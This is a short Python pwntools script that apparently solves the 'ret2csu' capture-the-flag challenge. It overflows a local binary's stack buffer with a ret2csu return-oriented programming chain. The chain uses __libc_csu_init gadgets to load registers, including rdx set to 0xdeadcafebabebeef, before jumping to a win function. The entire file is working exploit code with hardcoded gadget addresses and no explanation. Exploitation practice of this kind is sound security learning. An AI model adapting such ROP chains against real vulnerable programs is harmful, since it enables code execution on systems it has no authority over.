#coding=utf8
from pwn import *
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']
context.arch = 'amd64'

local = 1

if local:
	cn = process('./ret2csu')
	# bin = ELF('./task_shoppingCart',checksec=False)
	# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
	# libc = ELF('/lib/i386-linux-gnu/libc.so.6',checksec=False)


init_add = 0x0600E10
rop1_add = 0x0400896 #add rsp, 8 ; pop rbx ; pop rbp ; r12 r13 r14 r15 ret
rop2_add = 0x0400880 #mov rdx, r15 ; mov rsi, r14 ; mov edi, r13d ; call qword ptr [r12+rbx*8]
# z('b*0x04006E2\nc')
win_add = 0x04007B1
cn.recvuntil('beef')

payload = 'A'*0x20
payload += p64(0) # rbp
payload += p64(rop1_add) #ret
payload += p64(0) #padding
payload += p64(0) #rbx
payload += p64(1) #rbp
payload += p64(init_add) #r12
payload += p64(0x0601060) #r13
payload += p64(0) #r14
payload += p64(0xdeadcafebabebeef) #r15
payload += p64(rop2_add) #ret
payload += p64(0) #padding
payload += p64(0) #rbx
payload += p64(0) #rbp
payload += p64(0) #r12
payload += p64(0) #r13
payload += p64(0) #r14
payload += p64(0) #r15
payload += p64(win_add) #ret

cn.sendline(payload)

cn.interactive()
